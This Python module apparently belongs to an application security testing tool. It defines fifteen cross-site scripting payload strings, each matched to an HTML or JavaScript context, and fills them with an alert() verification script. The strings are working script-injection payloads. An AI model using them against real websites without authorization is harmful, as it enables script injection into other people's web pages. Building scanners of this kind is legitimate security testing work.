##
## Application Security Threat Attack Modeling (ASTAM)
##
## Copyright (C) 2017 Applied Visions - http://securedecisions.com
##
## Written by Aspect Security - http://aspectsecurity.com
##
## Licensed under the Apache License, Version 2.0 (the "License");
## you may not use this file except in compliance with the License.
## You may obtain a copy of the License at
##
##     http://www.apache.org/licenses/LICENSE-2.0
##
## Unless required by applicable law or agreed to in writing, software
## distributed under the License is distributed on an "AS IS" BASIS,
## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
## See the License for the specific language governing permissions and
## limitations under the License.
##

"""
XssMapPayloads.py
"""

XSSMAP_PAYLOADS = []

JAVASCRIPT_PLACEHOLDER = '{JAVASCRIPT}'
TRIGGER_VALUE_PLACEHOLDER = '{TRIGGERVAL}'

VERIFY_SCRIPTS = ["alert(" + TRIGGER_VALUE_PLACEHOLDER + ")"]

this_payload = {}
this_payload['id'] = 1
this_payload['contexts'] = []
this_payload['contexts'].append('nodename')
this_payload['string'] = "script>" + JAVASCRIPT_PLACEHOLDER + "//"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 2
this_payload['contexts'] = []
this_payload['contexts'].append('nodename')
this_payload['string'] = "b onmouseover=" + JAVASCRIPT_PLACEHOLDER + " "
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 3
this_payload['contexts'] = []
this_payload['contexts'].append('attributename')
this_payload['string'] = "><script>" + JAVASCRIPT_PLACEHOLDER + ";/*"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 4
this_payload['contexts'] = []
this_payload['contexts'].append('attributename')
this_payload['string'] = "onmouseover=" + JAVASCRIPT_PLACEHOLDER + " "
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 5
this_payload['contexts'] = []
this_payload['contexts'].append('style')
this_payload['string'] = "</style><script>" + JAVASCRIPT_PLACEHOLDER + "</script><style>"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 6
this_payload['contexts'] = []
this_payload['contexts'].append('attributevalue')
this_payload['contexts'].append('styleattrib')
this_payload['contexts'].append('classattrib')
this_payload['string'] = "'><script>" + JAVASCRIPT_PLACEHOLDER + "/*"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 7
this_payload['contexts'] = []
this_payload['contexts'].append('attributevalue')
this_payload['contexts'].append('styleattrib')
this_payload['contexts'].append('classattrib')
this_payload['string'] = "'onmouseover='" + JAVASCRIPT_PLACEHOLDER + " "
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 8
this_payload['contexts'] = []
this_payload['contexts'].append('comment')
this_payload['string'] = "--><script>" + JAVASCRIPT_PLACEHOLDER + "</script><!--"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 9
this_payload['contexts'] = []
this_payload['contexts'].append('comment')
this_payload['string'] = "--><b onmouseover=" + JAVASCRIPT_PLACEHOLDER + " >text</b><!--"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 10
this_payload['contexts'] = []
this_payload['contexts'].append('jssinglequote')
this_payload['string'] = ";" + JAVASCRIPT_PLACEHOLDER + "//"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 11
this_payload['contexts'] = []
this_payload['contexts'].append('jssinglequote')
this_payload['string'] = "'" + JAVASCRIPT_PLACEHOLDER + "//"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 12
this_payload['contexts'] = []
this_payload['contexts'].append('jsdoublequote')
this_payload['string'] = "\";" + JAVASCRIPT_PLACEHOLDER + "//"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 13
this_payload['contexts'] = []
this_payload['contexts'].append('jsdoublequote')
this_payload['string'] = "\"" + JAVASCRIPT_PLACEHOLDER + "//"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 14
this_payload['contexts'] = []
this_payload['contexts'].append('jssinglequote')
this_payload['contexts'].append('jsdoublequote')
this_payload['string'] = "</script><script>" + JAVASCRIPT_PLACEHOLDER + "</script><script>"
XSSMAP_PAYLOADS.append(this_payload)

this_payload = {}
this_payload['id'] = 15
this_payload['contexts'] = []
this_payload['contexts'].append('jsnode')
this_payload['string'] = JAVASCRIPT_PLACEHOLDER
XSSMAP_PAYLOADS.append(this_payload)

for i, payload in enumerate(XSSMAP_PAYLOADS):

    s = XSSMAP_PAYLOADS[i]['string']

    # Below is temporary, while len(VERIFY_SCRIPTS) is 1...
    XSSMAP_PAYLOADS[i]['string'] = s.replace(JAVASCRIPT_PLACEHOLDER, VERIFY_SCRIPTS[0])
